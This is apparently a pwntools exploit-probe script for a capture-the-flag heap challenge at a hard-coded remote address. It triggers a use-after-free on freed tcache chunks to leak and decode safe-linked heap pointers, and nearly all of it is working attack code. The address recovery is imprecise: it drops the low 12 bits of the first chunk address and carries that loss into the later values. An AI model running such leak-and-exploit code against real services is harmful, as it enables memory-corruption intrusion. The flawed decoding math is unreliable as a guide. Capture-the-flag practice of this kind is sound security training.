#!/usr/bin/env python3
"""Probe: allocate large spell, read UAF to see heap layout"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')

# Create 3 spells of size 0x80, banish all, then read all
log.info("Creating 3 spells of size 0x80")
create(p, 0, 0x80, b'A' * 0x10 + b'\n')
create(p, 1, 0x80, b'B' * 0x10 + b'\n')
create(p, 2, 0x80, b'C' * 0x10 + b'\n')

log.info("Banishing all 3")
banish(p, 0)
banish(p, 1)
banish(p, 2)

# Read all 3 UAFs
fds = []
for idx in [2, 1, 0]:
    data = recite(p, idx, 0x80)
    fd = u64(data[0:8])
    key = u64(data[8:16])
    fds.append(fd)
    log.info(f"spell {idx}: fd={hex(fd)}, key={hex(key)}")

# fds[0] = spell 2 (freed last, tcache head)
# fds[1] = spell 1 (freed second)
# fds[2] = spell 0 (freed first, tcache was empty)
#
# Tcache chain: spell2 -> spell1 -> spell0
# spell2->fd = (spell2_addr >> 12) ^ spell1_addr
# spell1->fd = (spell1_addr >> 12) ^ spell0_addr
# spell0->fd = (spell0_addr >> 12) ^ 0 = spell0_addr >> 12

# spell0_addr from fds[2]
spell0_addr = fds[2] << 12
log.info(f"spell0_addr = {hex(spell0_addr)}")

# spell1_addr from fds[1] and spell0_addr
# fds[1] = (spell1_addr >> 12) ^ spell0_addr
spell1_shifted = fds[1] ^ spell0_addr
spell1_addr = spell1_shifted << 12
log.info(f"spell1_addr = {hex(spell1_addr)}")
log.info(f"diff spell1-spell0 = {hex(spell1_addr - spell0_addr)}")

# spell2_addr from fds[0] and spell1_addr
# fds[0] = (spell2_addr >> 12) ^ spell1_addr
spell2_shifted = fds[0] ^ spell1_addr
spell2_addr = spell2_shifted << 12
log.info(f"spell2_addr = {hex(spell2_addr)}")
log.info(f"diff spell2-spell1 = {hex(spell2_addr - spell1_addr)}")

# Expected: diffs should be 0x90 (chunk size)
# If not, there are other allocations between them

p.sendline(b'0')
p.close()
